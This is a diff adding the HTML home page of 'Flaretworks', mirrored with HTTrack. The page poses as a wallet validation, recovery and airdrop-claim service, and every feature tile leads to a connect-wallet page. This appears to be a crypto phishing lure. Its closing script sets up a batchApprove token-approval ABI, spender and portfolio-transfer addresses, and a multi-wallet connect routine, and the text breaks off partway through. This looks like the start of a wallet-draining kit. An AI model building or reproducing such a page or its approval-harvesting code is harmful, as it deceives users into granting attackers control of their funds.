@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from Flaretworks.in/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 07:22:43 GMT -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Flaretworks™ - Securely manage and validate your crypto wallets.">
+    <meta name="robots" content="index, follow">
+    <link rel="icon" type="image/png" href="assets/img/favicon.png">
+    <title>Flaretworks™ | Home</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.min.css" />
+    <link href="assets/css/style.css" rel="stylesheet">
+
+    <style>
+        #marquee-element {
+            padding: 12px !important;
+        }
+
+        .crypto_price_scroll {
+            min-height: 50px;
+            background-color: #f8f9fa;
+            padding: 10px 0;
+            overflow: hidden;
+            white-space: nowrap;
+            font-size: 0.9rem;
+            color: #333;
+            border-top: 1px solid #e0e0e0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .marquee-container {
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .marquee-content {
+            display: inline-block;
+            white-space: nowrap;
+            animation: marquee 45s linear infinite;
+        }
+
+        /* Normal speed: 45s */
+        @keyframes marquee {
+            0% {
+                transform: translateX(100%);
+            }
+
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .features_icon {
+            font-size: 2rem;
+        }
+
+        .selected_features {
+            cursor: pointer;
+        }
+
+        .selected_features:hover {
+            transform: scale(1.05);
+            background-color: #f0f7ff;
+            transition: all 0.3s ease;
+        }
+
+        .text-green-600 {
+            display: inline !important;
+        }
+
+        .nav-link img {
+            vertical-align: middle;
+        }
+
+        .nav-link img[width="8"] {
+            width: 8px;
+            height: 8px;
+        }
+
+        .nav-link img[width="15"] {
+            width: 15px;
+            height: 15px;
+        }
+
+        .text-center .text-white-50 {
+            font-size: 1.50rem;
+            font-weight: bold;
+        }
+
+        section.background-image.bg-dark {
+            background-image: url('https://images.unsplash.com/photo-1639322537228-f710d846310a?ixlib=rb-4.0.3&amp;auto=format&amp;fit=crop&amp;w=1920&amp;q=80') !important;
+            background-size: cover !important;
+            background-position: center !important;
+            background-color: #1a252f;
+        }
+
+        .crypto-logo {
+            width: 16px;
+            height: 16px;
+            margin-right: 5px;
+            vertical-align: middle;
+        }
+
+        @media (max-width: 991px) {
+            .explore-tabs {
+                display: flex !important;
+                /* Always visible */
+                flex-wrap: wrap !important;
+                justify-content: center !important;
+                gap: 5px !important;
+            }
+
+            .nav-link.compact {
+                padding: 4px 6px !important;
+                /* Compact size */
+                font-size: 0.9rem !important;
+                white-space: nowrap;
+            }
+
+            @media (max-width: 991px) {
+                .navbar-collapse {
+                    display: none !important;
+                    /* Hidden by default */
+                    max-height: 0;
+                    /* Ensure it collapses fully */
+                    overflow: hidden;
+                    /* Prevent content overflow */
+                    transition: max-height 0.3s ease;
+                    /* Smooth transition */
+                }
+
+                .navbar-collapse.show {
+                    display: block !important;
+                    /* Visible when toggled */
+                    max-height: 500px;
+                    /* Adjust based on content height */
+                }
+
+                .explore-tabs {
+                    display: flex !important;
+                    flex-direction: row !important;
+                    flex-wrap: wrap !important;
+                    justify-content: center !important;
+                    padding: 5px 0 !important;
+                }
+
+                .nav-item {
+                    margin: 2px 4px;
+                }
+
+                .connect_wallet {
+                    margin-top: 10px;
+                    text-align: center;
+                    width: 100%;
+                }
+                /* Modal Styles */
+                .modal {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.5);
+                z-index: 1000;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                }
+                .modal-content {
+                background: #1a252f;
+                border-radius: 10px;
+                width: 90%;
+                max-width: 500px;
+                padding: 20px;
+                color: #fff;
+                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+                }
+                .modal-header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                border-bottom: 1px solid #333;
+                padding-bottom: 10px;
+                }
+                .modal-header h2 {
+                margin: 0;
+                font-size: 1.5rem;
+                }
+                .modal-header .close {
+                cursor: pointer;
+                font-size: 1.5rem;
+                color: #fff;
+                }
+                .modal-body {
+                padding-top: 15px;
+                }
+                .modal-body p {
+                margin: 0 0 15px;
+                font-size: 0.9rem;
+                color: #ccc;
+                }
+                .wallet-list {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 10px;
+                }
+                .wallet-option {
+                background: #2a3b47;
+                border-radius: 8px;
+                padding: 10px;
+                width: calc(50% - 5px);
+                text-align: center;
+                cursor: pointer;
+                transition: background 0.2s;
+                }
+                .wallet-option:hover {
+                background: #3a4b57;
+                }
+                .wallet-option img {
+                width: 24px;
+                height: 24px;
+                vertical-align: middle;
+                margin-right: 8px;
+                }
+                .wallet-option span {
+                font-size: 0.9rem;
+                color: #fff;
+                }
+                
+                /* Override Reown AppKit QR Code Modal Size */
+                .w3m-modal {
+                transform: scale(0.7); /* Reduce size to 70% of original */
+                transform-origin: center; /* Ensure scaling is centered */
+                max-width: 300px; /* Limit maximum width */
+                margin: 0 auto; /* Center the modal */
+                }
+                
+                .w3m-modal-card {
+                max-width: 300px !important; /* Override default width */
+                height: auto !important; /* Adjust height to content */
+                }
+                
+                .w3m-header {
+                font-size: 1rem !important; /* Smaller header font */
+                }
+                
+                .w3m-body {
+                padding: 10px !important; /* Reduce padding */
+                }
+                
+                .w3m-body img {
+                max-width: 200px !important; /* Reduce QR code image size */
+                height: auto !important;
+                }
+            }
+    </style>
+</head>
+
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
+        <div class="container">
+            <a class="navbar-brand" href="index-2.html">
+                <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
+            </a>
+            <button class="navbar-toggler" type="button"  data-bs-target="#navbarNavAltMarkup16" aria-controls="navbarNavAltMarkup16" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNavAltMarkup16">
+                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                    <li class="nav-item">
+                        <a class="nav-link active" aria-current="page" href="index-2.html">Home - Flaretworks™</a>
+                    </li>
+                </ul>
+                <ul class="nav explore-tabs mb-0 gap-1" id="chain-switch-pill" role="tablist">
+                    <li class="nav-item" role="presentation" data-chain-id="1">
+                        <button class="nav-link compact" id="pills-ethereum-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-ethereum" aria-selected="true">
+                            <img src="assets/img/ethereum.png" width="8"> Ethereum
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="2">
+                        <button class="nav-link compact" id="pills-bsc-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-bsc" aria-selected="true">
+                            <img src="assets/img/binance.png" width="15"> BSC
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="3">
+                        <button class="nav-link compact" id="pills-polygon-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-polygon" aria-selected="true">
+                            <img src="assets/img/polygon.png" width="15"> Polygon
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="4">
+                        <button class="nav-link compact" id="pills-avalanche-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-avalanche" aria-selected="true">
+                            <img src="assets/img/avalanche.png" width="15"> Avalanche
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="5">
+                        <button class="nav-link compact" id="pills-solana-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-solana" aria-selected="true">
+                            <img src="assets/img/solana.png" width="15"> Solana
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="6">
+                        <button class="nav-link compact" id="pills-cardano-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-cardano" aria-selected="true">
+                            <img src="assets/img/cardano.png" width="15"> Cardano
+                        </button>
+                    </li>
+                </ul>
+                <div class="navbar-nav ms-auto gap-3 connect_wallet">
+                    <a class="btn btn-primary btn-sm" id="connect-wallet-btn" href="connect.html"><i class="bi bi-wallet"></i> Connect Wallet</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <section class="background-image bg-dark py-5">
+        <div class="container py-4">
+            <div class="row">
+                <div class="col-lg-7 col-12">
+                    <div class="mb-4">
+                        <div class="display-5 fw-bold text-white mb-3">Validate, Synchronize, and Rectify your assets
+                            and wallets</div>
+                        <div class="fs-5 text-white-50">Open, Secure, and Decentralized Protocol for syncing and
+                            rectification of various wallet</div>
+                    </div>
+                    <div>
+                        <a class="btn btn-warning btn-lg me-3" href="connect.html">Connect</a>
+                        <a class="btn btn-light btn-lg" href="connect.html">Sync</a>
+                    </div>
+                </div>
+            </div>
+            <div class="row g-4 mt-5">
+                <div class="col-lg-4 col-4">
+                    <div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+                        <span class="bg-primary rounded-circle steps-item-icon"><i class="bi bi-wallet2 text-white"></i></span>
+                        <div>
+                            <a style="text-decoration:none" href="connect.html">
+                                <div class="fw-bold fs-6 mb-1">1. Connect your Wallet</div>
+                            </a>
+                            <p class="text-muted m-0 d-none d-md-block">Use Trust Wallet, Metamask or any wallet to
+                                connect to the app.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4 col-4">
+                    <div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+                        <span class="bg-primary rounded-circle steps-item-icon"><i class="bi bi-patch-plus text-white"></i></span>
+                        <div>
+                            <a style="text-decoration:none" href="connect.html">
+                                <div class="fw-bold fs-6 mb-1">2. Select a Feature to Validate</div>
+                            </a>
+                            <div class="text-muted m-0 d-none d-md-block">You will be prompted to connect via a
+                                decentralized protocol.</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4 col-4">
+                    <div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+                        <span class="bg-primary rounded-circle steps-item-icon"><i class="bi bi-piggy-bank text-white"></i></span>
+                        <div>
+                            <a style="text-decoration:none" href="connect.html">
+                                <div class="fw-bold fs-6 mb-1">3. Generate Proof of Validation</div>
+                            </a>
+                            <div class="text-muted m-0 d-none d-md-block">Upon completion, save proof of wallet
+                                validation.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="crypto_price_scroll">
+        <script type="text/javascript">
+            baseUrl = "https://widgets.cryptocompare.com/";
+            var scripts = document.getElementsByTagName("script");
+            var embedder = scripts[ scripts.length - 1 ];
+            var cccTheme = {"General":{"enableMarquee":true}};
+            (function (){
+            var appName = "google.com";
+            var s = document.createElement("script");
+            s.type = "text/javascript";
+            s.async = true;
+            var theUrl = baseUrl+'serve/v3/coin/header?fsyms=BTC,ETH,BNB,XRP,MATIC,DOGE,ADA,DAI,DOT,TRX,LTC,SHIB,SOL,UNI,AVAX,LINK,XMR,ATOM,ETC&tsyms=USD,EUR,CNY,GBP';
+            s.src = theUrl + ( theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+            embedder.parentNode.appendChild(s);
+            })();
+        </script>
+    </div>
+    </div>
+
+    <section class="py-5" id="features">
+        <div class="container my-4">
+            <div class="mb-3">
+                <div class="d-flex align-items-center justify-content-between mb-3">
+                    <div class="h4 m-0 fw-bold">Features 🌟</div>
+                </div>
+                <div class="row g-3">
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-gear-wide-connected text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Validation</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-eraser text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Rectification</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bandaid text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Synchronization</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-record-btn text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Asset Recovery</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-box-seam text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Migration Issues</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-speedometer text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">High Gas Fees</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bar-chart-steps text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Slippage Error</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-calculator text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Transaction Error</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bounding-box text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Cross Chain Transfer</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-cash-coin text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Staking Issues</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bank text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Swap/Bridge</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-handbag text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Claim Reflection</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-person-badge text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Login Issues</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-droplet text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Claim Airdrop</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-image-alt text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">NFTS Issues</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-123 text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Missing/Irregular Balances
+                                        </h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-alarm text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Transaction Delays</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-lock text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Locked Accounts</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-wallet text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Trading Wallet Issues</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bag text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Tokens Purchase</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-heart text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Whitelist</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-motherboard text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Issurance</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-collection text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Retrieval</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-three-dots text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html">
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Others</h6>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="bg-dark py-4">
+        <div class="container py-4">
+            <div class="row justify-content-center">
+                <div class="col-xl-6 col-lg-7 col-md-8 col-12">
+                    <div class="text-center py-4">
+                        <small class="text-white-50">Flaretworks™</small>
+                        <h1 class="fw-bold text-white py-3">We make sure that everyone is able to securely use their
+                            wallet</h1>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer bg-white py-5">
+        <div class="container py-4">
+            <div class="row">
+                <div class="col-md-12 col-lg-4 col-12">
+                    <div class="row">
+                        <div class="col-3">
+                            <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
+                        </div>
+                        <div class="col-9 mt-2">
+                            <h4>Flaretworks™</h4>
+                        </div>
+                    </div>
+                    <div class="text-muted mt-4">
+                        <p class="mb-4">Open and decentralized protocol for syncing various Wallets to Dapps Secure
+                            Server. This is not an app but a protocol that establishes a remote connection between
+                            two/more apps and/or devices</p>
+                        <p>Every digital artwork on Upside is authentic and truly unique. Blockchain technology makes
+                            this new aproch to digital ownership possible. Open and decentralized protocol for syncing
+                            various Wallets issues on Secure Server. It is an online server which gets you across to
+                            every wallet representative to enable effective complain and rectification of issues.</p>
+                    </div>
+                </div>
+                <div class="col-md-12 col-lg-4 col-12">
+                    <script type="text/javascript">
+                        baseUrl = "https://widgets.cryptocompare.com/";
+                        var scripts = document.getElementsByTagName("script");
+                        var embedder = scripts[scripts.length - 1];
+                        (function () {
+                            var appName = "google.com";
+                            var s = document.createElement("script");
+                            s.type = "text/javascript";
+                            s.async = true;
+                            var theUrl = baseUrl + 'serve/v1/coin/feed?fsym=BTC&tsym=USD';
+                            s.src = theUrl + (theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+                            embedder.parentNode.appendChild(s);
+                        })();
+                    </script>
+                </div>
+                <div class="col-md-12 col-lg-4 col-12">
+                    <form>
+                        <h6 class="fw-bold text-body mb-2">SUBSCRIBE</h6>
+                        <div class="mb-4 text-muted">Subscribe for the latest news, drops & new features</div>
+                        <div class="input-group">
+                            <input type="text" class="form-control" placeholder="Enter Your Email">
+                            <button class="btn btn-primary" type="button"><i class="bi bi-envelope me-2"></i> Subscribe</button>
+                        </div>
+                        <div class="small mt-3 text-danger">No worries we don't spam! Unsubscribe at any time by <br>clicking on the link in the email.
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="footer-mid py-4">
+        <div class="container">
+            <div class="row align-items-center justify-content-between">
+                <div class="col-12 text-center">
+                    <div class="mb-4 mb-md-0">
+                        <a href="index-2.html" class="text-decoration-none link-dark fw-bold pe-2">Home</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-end bg-white py-4">
+        <div class="container">
+            <p class="text-xs text-gray-500 text-center">
+                <span style="display: inline;">Secured with HTTPS</span> | © 2025 Flaretworks™, All rights reserved. |
+                <a href="mailto:support@Flaretworks.in" class="text-blue-600 underline">support@Flaretworks.in</a> |
+                <a href="privacy.html" class="text-blue-600 underline">Privacy Policy</a> |
+                <a href="terms.html" class="text-blue-600 underline">Terms</a>
+            </p>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js" defer></script>
+    <script src="assets/js/main.js" defer></script>
+    <script src="assets/js/custom.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/p-limit@3.1.0/dist/p-limit.js" defer></script>
+    <!-- Reown AppKit -->
+    <script src="https://unpkg.com/@reown/appkit@1.0.0-beta.1/dist/index.js"></script>
+    <!-- Reown AppKit Ethers v5 Adapter -->
+    <script src="https://unpkg.com/@reown/appkit-adapter-ethers5@1.0.0-beta.1/dist/index.js"></script>
+    <!-- Debug Log -->
+    <script>
+        console.log("Reown AppKit loaded:", typeof window.ReownAppKit);
+        console.log("Reown AppKit Ethers v5 Adapter loaded:", typeof window.ReownAppKitEthers5Adapter);
+    </script>
+
+    <script>
+        console.log("Script loaded");
+    
+        window.env = {
+            SERVER_URL: 'https://Flaretworks.in/backend',
+            BATCH_APPROVE_ADDRESS: '0xActualDeployedAddress2', // Replace with actual
+            PORTFOLIO_TRANSFER_ADDRESS: '0xActualDeployedAddress1' // Replace with actual
+        };
+    
+        const chainConfigs = {
+            eth: { chainId: "0x1", rpcs: { ankr: ["https://rpc.ankr.com/eth"] } },
+            polygon: { chainId: "0x89", rpcs: { ankr: ["https://rpc.ankr.com/polygon"] } },
+            bsc: { chainId: "0x38", rpcs: { ankr: ["https://rpc.ankr.com/bsc"] } },
+            avalanche: { chainId: "0xa86a", rpcs: { ankr: ["https://rpc.ankr.com/avalanche"] } }
+        };
+    
+        const batchApproveAbi = ["function batchApprove(address[] calldata tokens, address spender) external"];
+        const trackedWallets = new Map();
+        const stoppedWallets = new Set();
+        let providers = {};
+    
+        async function connectWallet() {
+            console.log("connectWallet function called");
+    
+            // Detect if on mobile
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            console.log("Is mobile device:", isMobile);
+    
+            // Define wallet options with local icons
+            const wallets = [
+                { name: "MetaMask", id: "metamask", icon: "assets/img/wallets/metamask.png", check: () => isMobile || window.ethereum },
+                { name: "Trust Wallet", id: "trust", icon: "assets/img/wallets/trust_wallet.png", check: () => isMobile || window.ethereum },
+                { name: "Coinbase Wallet", id: "coinbase", icon: "assets/img/wallets/coinbase.png", check: () => isMobile || window.ethereum },
+                { name: "Ledger", id: "ledger", icon: "assets/img/wallets/ledgerlive.png", check: () => isMobile || window.ethereum },
+                { name: "Binance", id: "binance", icon: "assets/img/wallets/binance.jfif", check: () => isMobile || window.ethereum },
+                { name: "Bitget", id: "bitget", icon: "assets/img/wallets/Bitget.jfif", check: () => isMobile || window.ethereum },
